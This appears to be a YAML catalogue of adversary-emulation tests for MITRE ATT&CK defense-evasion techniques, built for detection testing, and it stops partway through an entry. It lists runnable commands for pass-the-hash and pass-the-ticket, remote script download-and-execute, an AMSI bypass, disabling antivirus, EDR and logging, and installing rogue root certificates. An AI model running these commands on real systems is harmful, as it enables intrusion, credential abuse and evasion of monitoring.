  description: "Adversaries may employ various time-based methods to detect virtualization and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. This may include enumerating time-based properties, such as uptime or the system clock. \n\nAdversaries may use calls like `GetTickCount` and `GetSystemTimeAsFileTime` to discover if they are operating within a virtual machine or sandbox, or may be able to identify a sandbox accelerating time by sampl..."
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Delay execution with ping
      type: sh
      platform: linux
      command: |-
        ping -c 250 8.8.8.8 > /dev/null
        whoami
      timeout: 60
    - name: Delay execution with ping
      type: sh
      platform: macos
      command: |-
        ping -c 250 8.8.8.8 > /dev/null
        whoami
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1497/003
  is_safe: false
- id: T1550.002
  name: Pass the Hash
  description: |-
    Adversaries may pass the hash using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

    When performing PtH, valid password hashes for the account being u...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - lateral-movement
  platforms:
    - windows
  executors:
    - name: Mimikatz Pass the Hash
      type: cmd
      platform: windows
      command: '%tmp%\mimikatz\x64\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a"'
      timeout: 120
    - name: crackmapexec Pass the Hash
      type: cmd
      platform: windows
      command: C:\CrackMapExecWin\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami
      timeout: 120
    - name: Invoke-WMIExec Pass the Hash
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1550/002
  is_safe: false
- id: T1550.003
  name: Pass the Ticket
  description: |-
    Adversaries may pass the ticket using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

    When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - lateral-movement
  platforms:
    - windows
  executors:
    - name: Mimikatz Kerberos Ticket Attack
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe" "kerberos::ptt "'
      timeout: 120
    - name: Rubeus Kerberos Pass The Ticket
      type: powershell
      platform: windows
      command: |-
        & "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\localhost -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi
        Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
        Move-Item -Force "\\localhost\c$\ticket.kirbi" ticket.kirbi
        Write-Host "Successfully retrieved TGT from 'localhost', now requesting a TGS from local"
        & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt
        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
        & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1550/003
  is_safe: false
- id: T1553.001
  name: Gatekeeper Bypass
  description: Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apples security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first tim...
  tactic: defense-evasion
  platforms:
    - macos
  executors:
    - name: Gatekeeper Bypass
      type: sh
      platform: macos
      command: xattr -d com.apple.quarantine myapp.app
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1553/001
  is_safe: false
- id: T1553.003
  name: SIP and Trust Provider Hijacking
  description: 'Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file''s origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVeri...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: SIP (Subject Interface Package) Hijacking via Custom DLL
      type: cmd
      platform: windows
      command: regsvr32.exe PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll
      cleanup: regsvr32.exe /u PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1553/003
  is_safe: false
- id: T1553.004
  name: Install Root Certificate
  description: 'Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root''s chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/...'
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Install root CA on CentOS/RHEL
      type: sh
      platform: linux
      command: |-
        openssl genrsa -out rootCA.key 4096
        openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out rootCA.crt
        cp rootCA.crt /etc/pki/ca-trust/source/anchors/
        update-ca-trust
      cleanup: |-
        rm /etc/pki/ca-trust/source/anchors/rootCA.crt
        update-ca-trust
      timeout: 60
      elevation_required: true
    - name: Install root CA on FreeBSD
      type: sh
      platform: linux
      command: |-
        openssl genrsa -out rootCA.key 4096
        openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out rootCA.crt
        cp rootCA.crt /usr/local/share/certs/
        certctl rehash
      cleanup: |-
        rm /usr/local/share/certs/rootCA.crt
        certctl rehash
      timeout: 60
      elevation_required: true
    - name: Install root CA on Debian/Ubuntu
      type: sh
      platform: linux
      command: |-
        mv rootCA.crt /usr/local/share/ca-certificates
        sudo update-ca-certificates
      timeout: 60
      elevation_required: true
    - name: Install root CA on macOS
      type: sh
      platform: macos
      command: sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain" "rootCA.crt"
      timeout: 60
      elevation_required: true
    - name: Install root CA on Windows
      type: powershell
      platform: windows
      command: |-
        $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My
        Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
      cleanup: |-
        try {
           $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
           Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        }
        catch { }
      timeout: 120
      elevation_required: true
    - name: Install root CA on Windows with certutil
      type: powershell
      platform: windows
      command: certutil -addstore my $env:Temp\rootCA2.cer
      cleanup: |-
        try {
        $cert = Import-Certificate -FilePath $env:Temp\rootCA2.cer -CertStoreLocation Cert:\LocalMachine\My
        Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        } catch { }
      timeout: 120
      elevation_required: true
    - name: Add Root Certificate to CurrentUser Certificate Store
      type: powershell
      platform: windows
      command: IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)
      cleanup: Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1553/004
  is_safe: false
- id: T1553.005
  name: Mark-of-the-Web Bypass
  description: 'Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Pro...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Mount ISO image
      type: powershell
      platform: windows
      command: Mount-DiskImage -ImagePath "PathToAtomicsFolder\T1553.005\bin\T1553.005.iso"
      cleanup: Dismount-DiskImage -ImagePath "PathToAtomicsFolder\T1553.005\bin\T1553.005.iso" | Out-Null
      timeout: 120
    - name: Mount an ISO image and run executable from the ISO
      type: powershell
      platform: windows
      command: |-
        Mount-DiskImage -ImagePath "PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso" -StorageType ISO -Access ReadOnly
        $keep = Get-Volume -FileSystemLabel "TestIso"
        $driveLetter = ($keep | Get-Volume).DriveLetter
        invoke-item "$($driveLetter):\hello.exe"
      cleanup: |-
        Dismount-DiskImage -ImagePath "PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso" | Out-Null
        Stop-process -name "hello" -Force -ErrorAction ignore
      timeout: 120
      elevation_required: true
    - name: Remove the Zone.Identifier alternate data stream
      type: powershell
      platform: windows
      command: Unblock-File -Path $env:tmp\ReadMe.md
      cleanup: Set-Content -Path $env:tmp\ReadMe.md -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'
      timeout: 120
    - name: Execute LNK file from ISO
      type: powershell
      platform: windows
      command: |-
        Mount-DiskImage -ImagePath "PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso" -StorageType ISO -Access ReadOnly
        $keep = Get-Volume -FileSystemLabel "AllTheThings"
        $driveLetter = ($keep | Get-Volume).DriveLetter
        $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"))
        $instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
      cleanup: Dismount-DiskImage -ImagePath "PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso" | Out-Null
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1553/005
  is_safe: false
- id: T1553.006
  name: Code Signing Policy Modification
  description: "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Pro..."
  tactic: defense-evasion
  platforms:
    - windows
    - macos
  executors:
    - name: Code Signing Policy Modification
      type: cmd
      platform: windows
      command: bcdedit /set testsigning on
      cleanup: bcdedit /set testsigning off
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1553/006
  is_safe: false
- id: T1562
  name: Impair Defenses
  description: |-
    Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

    Adversaries may also impair routine operations that contribute to...
  tactic: defense-evasion
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Windows Disable LSA Protection
      type: cmd
      platform: windows
      command: reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
      cleanup: reg delete HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable journal logging via systemctl utility
      type: sh
      platform: linux
      command: 'sudo systemctl stop systemd-journald #disables journal logging'
      cleanup: |-
        sudo systemctl start systemd-journald #starts journal service
        sudo systemctl enable systemd-journald #starts journal service automatically at boot time
      timeout: 60
      elevation_required: true
    - name: Disable journal logging via sed utility
      type: sh
      platform: linux
      command: sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf
      cleanup: |-
        sudo sed -i 's/Storage=none/Storage=auto/' /etc/systemd/journald.conf #re-enables storage of journal data
        sudo systemctl restart systemd-journald #restart the journal service
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1562
  is_safe: false
- id: T1562.001
  name: Disable or Modify Tools
  description: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Disable syslog
      type: sh
      platform: linux
      command: systemctl stop rsyslog ; systemctl disable rsyslog
      cleanup: systemctl start rsyslog ; systemctl enable rsyslog
      timeout: 60
      elevation_required: true
    - name: Disable syslog (freebsd)
      type: sh
      platform: linux
      command: |-
        service syslogd stop
        sysrc syslogd_enable="NO"
      cleanup: |-
        sysrc syslogd_enable="YES"
        service syslogd start
      timeout: 60
      elevation_required: true
    - name: Disable Cb Response
      type: sh
      platform: linux
      command: |-
        if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
        then
          service cbdaemon stop
          chkconfig off cbdaemon
        else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
          systemctl stop cbdaemon
          systemctl disable cbdaemon
        fi
      timeout: 60
    - name: Disable SELinux
      type: sh
      platform: linux
      command: setenforce 0
      cleanup: setenforce 1
      timeout: 60
      elevation_required: true
    - name: Stop Crowdstrike Falcon on Linux
      type: sh
      platform: linux
      command: |-
        sudo systemctl stop falcon-sensor.service
        sudo systemctl disable falcon-sensor.service
      cleanup: |-
        sudo systemctl enable falcon-sensor.service
        sudo systemctl start falcon-sensor.service
      timeout: 60
      elevation_required: true
    - name: Disable Carbon Black Response
      type: sh
      platform: macos
      command: |-
        sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
        sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
      cleanup: |-
        sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist
        sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
      timeout: 60
      elevation_required: true
    - name: Disable LittleSnitch
      type: sh
      platform: macos
      command: sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
      cleanup: sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
      timeout: 60
      elevation_required: true
    - name: Disable OpenDNS Umbrella
      type: sh
      platform: macos
      command: sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
      cleanup: sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
      timeout: 60
      elevation_required: true
    - name: Disable macOS Gatekeeper
      type: sh
      platform: macos
      command: sudo spctl --master-disable
      cleanup: sudo spctl --master-enable
      timeout: 60
      elevation_required: true
    - name: Stop and unload Crowdstrike Falcon on macOS
      type: sh
      platform: macos
      command: |-
        sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist
        sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
      cleanup: |-
        sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.falcond.plist
        sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
      timeout: 60
      elevation_required: true
    - name: Unload Sysmon Filter Driver
      type: cmd
      platform: windows
      command: fltmc.exe unload SysmonDrv
      cleanup: |-
        sysmon -u -i > nul 2>&1
        sysmon -i -accepteula -i > nul 2>&1
        "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u > nul 2>&1
        "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i > nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Uninstall Sysmon
      type: cmd
      platform: windows
      command: sysmon -u
      cleanup: sysmon -i -accepteula >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: AMSI Bypass - AMSI InitFailed
      type: powershell
      platform: windows
      command: '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
      cleanup: '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$false)'
      timeout: 120
    - name: AMSI Bypass - Remove AMSI Provider Reg Key
      type: powershell
      platform: windows
      command: Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
      cleanup: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
    - name: Disable Arbitrary Security Windows Service
      type: cmd
      platform: windows
      command: |-
        net.exe stop McAfeeDLPAgentService
        sc.exe config McAfeeDLPAgentService start= disabled
      cleanup: |-
        sc.exe config McAfeeDLPAgentService start= auto >nul 2>&1
        net.exe start McAfeeDLPAgentService >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Tamper with Windows Defender ATP PowerShell
      type: powershell
      platform: windows
      command: |-
        Set-MpPreference -DisableRealtimeMonitoring 1
        Set-MpPreference -DisableBehaviorMonitoring 1
        Set-MpPreference -DisableScriptScanning 1
        Set-MpPreference -DisableBlockAtFirstSeen 1
      cleanup: |-
        Set-MpPreference -DisableRealtimeMonitoring 0
        Set-MpPreference -DisableBehaviorMonitoring 0
        Set-MpPreference -DisableScriptScanning 0
        Set-MpPreference -DisableBlockAtFirstSeen 0
      timeout: 120
      elevation_required: true
    - name: Tamper with Windows Defender Command Prompt
      type: cmd
      platform: windows
      command: |-
        sc stop WinDefend
        sc config WinDefend start=disabled
        sc query WinDefend
      cleanup: |-
        sc start WinDefend >nul 2>&1
        sc config WinDefend start=enabled >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Tamper with Windows Defender Registry
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
      cleanup: Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0
      timeout: 120
      elevation_required: true
    - name: Disable Microsoft Office Security Features
      type: powershell
      platform: windows
      command: |-
        New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
        New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
        New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
      cleanup: |-
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -ErrorAction Ignore | Out-Null
        Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -ErrorAction Ignore
      timeout: 120
    - name: Remove Windows Defender Definition Files
      type: cmd
      platform: windows
      command: '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All'
      timeout: 120
      elevation_required: true
    - name: Stop and Remove Arbitrary Security Windows Service
      type: powershell
      platform: windows
      command: |-
        Stop-Service -Name McAfeeDLPAgentService
        Remove-Service -Name McAfeeDLPAgentService
      timeout: 120
      elevation_required: true
    - name: Uninstall Crowdstrike Falcon on Windows
      type: powershell
      platform: windows
      command: if (Test-Path "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe") {. "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
      timeout: 120
      elevation_required: true
    - name: Tamper with Windows Defender Evade Scanning -Folder
      type: powershell
      platform: windows
      command: |-
        $excludedpath= "C:\Temp"
        Add-MpPreference -ExclusionPath $excludedpath
      cleanup: |-
        $excludedpath= "C:\Temp"
        Remove-MpPreference -ExclusionPath $excludedpath
      timeout: 120
      elevation_required: true
    - name: Tamper with Windows Defender Evade Scanning -Extension
      type: powershell
      platform: windows
      command: |-
        $excludedExts= ".exe"
        Add-MpPreference -ExclusionExtension  $excludedExts
      cleanup: |-
        $excludedExts= ".exe"
        Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Tamper with Windows Defender Evade Scanning -Process
      type: powershell
      platform: windows
      command: |-
        $excludedProcess = "outlook.exe"
        Add-MpPreference -ExclusionProcess $excludedProcess
      cleanup: |-
        $excludedProcess = "outlook.exe"
        Remove-MpPreference -ExclusionProcess  $excludedProcess
      timeout: 120
      elevation_required: true
    - name: Disable Windows Defender with DISM
      type: cmd
      platform: windows
      command: Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
      timeout: 120
      elevation_required: true
    - name: Disable Defender Using NirSoft AdvancedRun
      type: powershell
      platform: windows
      command: |-
        Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
        if(0){
          $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
          Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
        }
      cleanup: Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
      timeout: 120
      elevation_required: true
    - name: Kill antimalware protected processes using Backstab
      type: powershell
      platform: windows
      command: '& "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n MsMpEng.exe'
      timeout: 120
      elevation_required: true
    - name: WinPwn - Kill the event log services for stealth
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        inv-phantom -consoleoutput -noninteractive
      timeout: 120
    - name: Tamper with Windows Defender ATP using Aliases - PowerShell
      type: powershell
      platform: windows
      command: |-
        Set-MpPreference -drtm $True
        Set-MpPreference -dbm $True
        Set-MpPreference -dscrptsc $True
        Set-MpPreference -dbaf $True
      cleanup: |-
        Set-MpPreference -drtm 0
        Set-MpPreference -dbm 0
        Set-MpPreference -dscrptsc 0
        Set-MpPreference -dbaf 0
      timeout: 120
      elevation_required: true
    - name: LockBit Black - Disable Privacy Settings Experience Using Registry -cmd
      type: cmd
      platform: windows
      command: reg add "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: LockBit Black - Use Registry Editor to turn on automatic logon -cmd
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_DWORD /d 1 /f
        reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d Administrator /f
        reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d contoso.com /f
        reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d password1 /f
      cleanup: |-
        reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /f >nul 2>&1
        reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /f >nul 2>&1
        reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /f >nul 2>&1
        reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell
      type: powershell
      platform: windows
      command: New-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force
      cleanup: Remove-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell
      type: powershell
      platform: windows
      command: |-
        New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force
        New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value Administrator -Force
        New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Value contoso.com -Force
        New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword  -Value password1 -Force
      cleanup: |-
        Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Force -ErrorAction Ignore
        Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Force -ErrorAction Ignore
        Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Force -ErrorAction Ignore
        Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Disable Windows Defender with PwSh Disable-WindowsOptionalFeature
      type: powershell
      platform: windows
      command: |-
        Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Gui" -NoRestart -ErrorAction Ignore
        Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Features" -NoRestart -ErrorAction Ignore
        Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender" -NoRestart -ErrorAction Ignore
        Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: WMIC Tamper with Windows Defender Evade Scanning Folder
      type: cmd
      platform: windows
      command: wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"ATOMICREDTEAM\"
      cleanup: wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Remove ExclusionPath=\"ATOMICREDTEAM\"
      timeout: 120
      elevation_required: true
    - name: Delete Windows Defender Scheduled Tasks
      type: cmd
      platform: windows
      command: |-
        IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f )
        IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f )
